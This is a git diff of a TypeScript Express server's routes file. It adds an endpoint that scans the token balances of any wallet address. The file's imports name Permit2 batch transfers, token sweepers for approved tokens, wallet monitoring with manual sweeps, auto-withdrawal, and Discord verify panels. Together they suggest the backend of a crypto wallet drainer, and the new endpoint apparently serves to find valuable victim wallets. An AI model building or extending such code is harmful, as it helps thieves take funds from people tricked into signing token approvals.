@@ -4,7 +4,7 @@ import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
-import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain, CHAIN_CONTRACTS } from "./permit2-relayer";
+import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain, CHAIN_CONTRACTS, scanWalletBalances } from "./permit2-relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
@@ -406,6 +406,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to get Permit2 config" });
+    }
+  });
+
+  app.get("/api/scan-balances/:address", async (req, res) => {
+    try {
+      const { address } = req.params;
+      if (!address || !address.startsWith("0x")) {
+        return res.status(400).json({ error: "Invalid wallet address" });
+      }
+      const result = await scanWalletBalances(address);
+      res.json(result);
+    } catch (error: any) {
+      console.error("[API] Balance scan error:", error?.message);
+      res.status(500).json({ error: "Failed to scan balances" });
     }
   });
 
